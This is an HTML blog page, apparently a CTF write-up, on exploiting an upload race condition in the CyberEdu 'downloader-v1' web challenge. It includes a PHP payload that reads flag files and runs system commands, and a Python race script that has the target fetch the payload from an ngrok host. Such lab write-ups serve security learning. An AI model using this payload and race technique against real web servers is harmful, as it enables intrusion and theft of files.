@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu downloader-v1 Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, web">
+<meta name="description" content="Challenge overview
+Don&rsquo;t you find it frustrating when you have uploaded some files on a website but you&rsquo;re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?
+
+Identifying the vulnerabilities
+In the GET request, we have a comment pointing us to flag.php, and the /file.php contains &ldquo;GET ME&rdquo;. Using gobuster, we find a /uploads/ directory. There&rsquo;s a /uploads/index.html, but it&rsquo;s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image&rsquo;s link?">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu downloader-v1 Writeup">
+  <meta property="og:description" content="Challenge overview Don’t you find it frustrating when you have uploaded some files on a website but you’re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?
+Identifying the vulnerabilities In the GET request, we have a comment pointing us to flag.php, and the /file.php contains “GET ME”. Using gobuster, we find a /uploads/ directory. There’s a /uploads/index.html, but it’s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image’s link?">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-12T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-12T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu downloader-v1 Writeup">
+<meta name="twitter:description" content="Challenge overview
+Don&rsquo;t you find it frustrating when you have uploaded some files on a website but you&rsquo;re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?
+
+Identifying the vulnerabilities
+In the GET request, we have a comment pointing us to flag.php, and the /file.php contains &ldquo;GET ME&rdquo;. Using gobuster, we find a /uploads/ directory. There&rsquo;s a /uploads/index.html, but it&rsquo;s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image&rsquo;s link?">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu downloader-v1 Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu downloader-v1 Writeup",
+  "name": "CyberEdu downloader-v1 Writeup",
+  "description": "Challenge overview Don\u0026rsquo;t you find it frustrating when you have uploaded some files on a website but you\u0026rsquo;re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?\nIdentifying the vulnerabilities In the GET request, we have a comment pointing us to flag.php, and the /file.php contains \u0026ldquo;GET ME\u0026rdquo;. Using gobuster, we find a /uploads/ directory. There\u0026rsquo;s a /uploads/index.html, but it\u0026rsquo;s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image\u0026rsquo;s link?\n",
+  "keywords": [
+    "CyberEdu", "web"
+  ],
+  "articleBody": "Challenge overview Don’t you find it frustrating when you have uploaded some files on a website but you’re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?\nIdentifying the vulnerabilities In the GET request, we have a comment pointing us to flag.php, and the /file.php contains “GET ME”. Using gobuster, we find a /uploads/ directory. There’s a /uploads/index.html, but it’s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image’s link?\nIt created a hash for a /uploads folder, stores the image inside, and removes any files with the .{php,pht,phtml,php4,php5,php6,php7} extensions.\nThe file is then accessible:\nBut not the /uploads/code one.\nTrying to connect to http://127.0.0.1/.htpasswd gives us an error that port 80 is not accessible, but the challenge port gives ‘invalid url’.\nWhat if we upload a .php file that would do something, and then quickly connect to it before the server removes it? Since there’s a lot of actions being done over there, and there’s a window where the file exists before it’s removed?\nNow that I had an idea of what I wanted, I forwarded it to Claude for a quick script. Before, I quickly whipped up a .php file and sent it, and we get a little confirmation of my idea:\nHere is the shell.php:\n\u003c?php // Disable output buffering for immediate response @ini_set('output_buffering', 0); @ini_set('implicit_flush', 1); ob_implicit_flush(true); echo \"=== PHP SHELL EXECUTED ===\\n\\n\"; // 1. Check for global FLAG variable if (isset($FLAG)) { echo \"[FLAG VARIABLE] \" . $FLAG . \"\\n\\n\"; } // 2. Try to include/read flag.php $flag_files = [ '/var/www/html/flag.php', './flag.php', '../flag.php', '../../flag.php', '../../../flag.php', ]; echo \"=== SEARCHING FOR FLAG.PHP ===\\n\"; foreach ($flag_files as $f) { if (file_exists($f)) { echo \"Found: $f\\n\"; // Read raw content echo \"Raw content:\\n\" . file_get_contents($f) . \"\\n\\n\"; // Try to include it include($f); echo \"\\n\"; } } // 3. Try common flag locations echo \"\\n=== SEARCHING COMMON LOCATIONS ===\\n\"; $locations = ['/flag.txt', '/flag', '../flag.txt', '../../flag.txt', '/tmp/flag.txt']; foreach ($locations as $loc) { if (file_exists($loc)) { echo \"Found: $loc\\n\"; echo file_get_contents($loc) . \"\\n\\n\"; } } // 4. List current directory echo \"\\n=== CURRENT DIRECTORY ===\\n\"; echo \"Path: \" . getcwd() . \"\\n\"; echo \"Files:\\n\"; print_r(scandir('.')); // 5. List parent directories echo \"\\n\\n=== PARENT DIRECTORY ===\\n\"; if (is_readable('..')) { print_r(scandir('..')); } // 6. Show all defined variables (might contain flag) echo \"\\n\\n=== DEFINED VARIABLES ===\\n\"; $vars = get_defined_vars(); foreach ($vars as $key =\u003e $val) { if (!is_array($val) \u0026\u0026 !is_object($val)) { echo \"$key = $val\\n\"; } } // 7. Try shell commands echo \"\\n\\n=== SHELL COMMANDS ===\\n\"; if (function_exists('system')) { echo \"Using system():\\n\"; system('cat /var/www/html/flag.php 2\u003e\u00261'); echo \"\\n\"; system('cat ../../flag.php 2\u003e\u00261'); echo \"\\n\"; system('find /var/www -name \"*flag*\" 2\u003e\u00261'); } echo \"\\n=== END ===\\n\"; ?\u003e Here is the python script:\n#!/usr/bin/env python3 import requests import threading import time # Configuration TARGET_URL = \"http://34.185.208.176:32331\" NGROK_URL = \"https://ecfd544c5949.ngrok-free.app/shell.php\" FILENAME = \"shell.php\" found = False def upload(): \"\"\"Upload the PHP file\"\"\" data = {\"url\": NGROK_URL} requests.post(TARGET_URL, data=data, timeout=5) def race(thread_id): \"\"\"Race to access the file\"\"\" global found target = f\"{TARGET_URL}/{FILENAME}\" for i in range(200): if found: break try: resp = requests.get(target, timeout=2) if resp.status_code == 200 and len(resp.text) \u003e 50: found = True print(f\"\\n{'='*60}\") print(f\"[+] SUCCESS on thread {thread_id}!\") print(f\"{'='*60}\") print(resp.text) print(f\"{'='*60}\\n\") break except: pass time.sleep(0.002) def main(): print(f\"[*] Target: {TARGET_URL}\") print(f\"[*] Racing to: {TARGET_URL}/{FILENAME}\\n\") # Start racing threads threads = [] for i in range(15): t = threading.Thread(target=race, args=(i,)) t.daemon = True t.start() threads.append(t) time.sleep(0.1) # Trigger upload print(\"[*] Uploading...\") upload() # Wait for threads time.sleep(10) if not found: print(\"[-] Failed to catch the file\") if __name__ == \"__main__\": main() And here is our flag:\nReally proud of this one!\n",
+  "wordCount" : "623",
+  "inLanguage": "en",
+  "datePublished": "2026-01-12T00:00:00Z",
+  "dateModified": "2026-01-12T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu downloader-v1 Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>Don&rsquo;t you find it frustrating when you have uploaded some files on a website but you&rsquo;re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?</p>
+<hr>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>In the GET request, we have a comment pointing us to flag.php, and the /file.php contains &ldquo;GET ME&rdquo;. Using gobuster, we find a <code>/uploads/</code> directory. There&rsquo;s a <code>/uploads/index.html</code>, but it&rsquo;s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image&rsquo;s link?</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/downloaderv1-writeup/look.png#center"></p>
+<p>It created a hash for a /uploads folder, stores the image inside, and removes any files with the <code>.{php,pht,phtml,php4,php5,php6,php7}</code> extensions.</p>
+<p>The file is then accessible:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/downloaderv1-writeup/dog.png#center"></p>
+<p>But not the <code>/uploads/code</code> one.</p>
+<p>Trying to connect to <code>http://127.0.0.1/.htpasswd</code> gives us an error that port 80 is not accessible, but the challenge port gives &lsquo;invalid url&rsquo;.</p>
+<p>What if we upload a .php file that would do something, and then quickly connect to it before the server removes it? Since there&rsquo;s a lot of actions being done over there, and there&rsquo;s a window where the file exists before it&rsquo;s removed?</p>
+<p>Now that I had an idea of what I wanted, I forwarded it to Claude for a quick script. Before, I quickly whipped up a <code>.php</code> file and sent it, and we get a little confirmation of my idea:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/downloaderv1-writeup/hint.png#center"></p>
+<p>Here is the <code>shell.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> Disable output buffering <span style="color:#66d9ef">for</span> immediate response
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ini_set</span>(<span style="color:#e6db74">&#39;output_buffering&#39;</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ini_set</span>(<span style="color:#e6db74">&#39;implicit_flush&#39;</span>, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>ob_implicit_flush(true);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;=== PHP SHELL EXECUTED ===</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> <span style="color:#ae81ff">1.</span> Check <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">global</span> FLAG variable
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (isset(<span style="color:#960050;background-color:#1e0010">$</span>FLAG)) {
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[FLAG VARIABLE] &#34;</span> <span style="color:#f92672">.</span> <span style="color:#960050;background-color:#1e0010">$</span>FLAG <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> <span style="color:#ae81ff">2.</span> Try to include<span style="color:#f92672">/</span>read flag<span style="color:#f92672">.</span>php
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>flag_files <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;/var/www/html/flag.php&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;./flag.php&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;../flag.php&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;../../flag.php&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;../../../flag.php&#39;</span>,
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;=== SEARCHING FOR FLAG.PHP ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>foreach (<span style="color:#960050;background-color:#1e0010">$</span>flag_files <span style="color:#66d9ef">as</span> <span style="color:#960050;background-color:#1e0010">$</span>f) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (file_exists(<span style="color:#960050;background-color:#1e0010">$</span>f)) {
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Found: $f</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">//</span> Read raw content
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Raw content:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">.</span> file_get_contents(<span style="color:#960050;background-color:#1e0010">$</span>f) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">//</span> Try to include it
+</span></span><span style="display:flex;"><span>        include(<span style="color:#960050;background-color:#1e0010">$</span>f);
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> <span style="color:#ae81ff">3.</span> Try common flag locations
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">=== SEARCHING COMMON LOCATIONS ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>locations <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;/flag.txt&#39;</span>, <span style="color:#e6db74">&#39;/flag&#39;</span>, <span style="color:#e6db74">&#39;../flag.txt&#39;</span>, <span style="color:#e6db74">&#39;../../flag.txt&#39;</span>, <span style="color:#e6db74">&#39;/tmp/flag.txt&#39;</span>];
+</span></span><span style="display:flex;"><span>foreach (<span style="color:#960050;background-color:#1e0010">$</span>locations <span style="color:#66d9ef">as</span> <span style="color:#960050;background-color:#1e0010">$</span>loc) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (file_exists(<span style="color:#960050;background-color:#1e0010">$</span>loc)) {
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Found: $loc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        echo file_get_contents(<span style="color:#960050;background-color:#1e0010">$</span>loc) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> <span style="color:#ae81ff">4.</span> List current directory
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">=== CURRENT DIRECTORY ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Path: &#34;</span> <span style="color:#f92672">.</span> getcwd() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Files:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>print_r(scandir(<span style="color:#e6db74">&#39;.&#39;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> <span style="color:#ae81ff">5.</span> List parent directories
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">=== PARENT DIRECTORY ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (is_readable(<span style="color:#e6db74">&#39;..&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    print_r(scandir(<span style="color:#e6db74">&#39;..&#39;</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> <span style="color:#ae81ff">6.</span> Show all defined variables (might contain flag)
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">=== DEFINED VARIABLES ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>vars <span style="color:#f92672">=</span> get_defined_vars();
+</span></span><span style="display:flex;"><span>foreach (<span style="color:#960050;background-color:#1e0010">$</span>vars <span style="color:#66d9ef">as</span> <span style="color:#960050;background-color:#1e0010">$</span>key <span style="color:#f92672">=&gt;</span> <span style="color:#960050;background-color:#1e0010">$</span>val) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">!</span>is_array(<span style="color:#960050;background-color:#1e0010">$</span>val) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#960050;background-color:#1e0010">!</span>is_object(<span style="color:#960050;background-color:#1e0010">$</span>val)) {
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;$key = $val</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> <span style="color:#ae81ff">7.</span> Try shell commands
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">=== SHELL COMMANDS ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (function_exists(<span style="color:#e6db74">&#39;system&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Using system():</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    system(<span style="color:#e6db74">&#39;cat /var/www/html/flag.php 2&gt;&amp;1&#39;</span>);
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    system(<span style="color:#e6db74">&#39;cat ../../flag.php 2&gt;&amp;1&#39;</span>);
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    system(<span style="color:#e6db74">&#39;find /var/www -name &#34;*flag*&#34; 2&gt;&amp;1&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">=== END ===</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Here is the python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuration</span>
+</span></span><span style="display:flex;"><span>TARGET_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://34.185.208.176:32331&#34;</span>
+</span></span><span style="display:flex;"><span>NGROK_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://ecfd544c5949.ngrok-free.app/shell.php&#34;</span>
+</span></span><span style="display:flex;"><span>FILENAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;shell.php&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>found <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Upload the PHP file&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;url&#34;</span>: NGROK_URL}
+</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(TARGET_URL, data<span style="color:#f92672">=</span>data, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">race</span>(thread_id):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Race to access the file&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> found
+</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>FILENAME<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">200</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> found:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(target, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">and</span> len(resp<span style="color:#f92672">.</span>text) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">50</span>:
+</span></span><span style="display:flex;"><span>                found <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
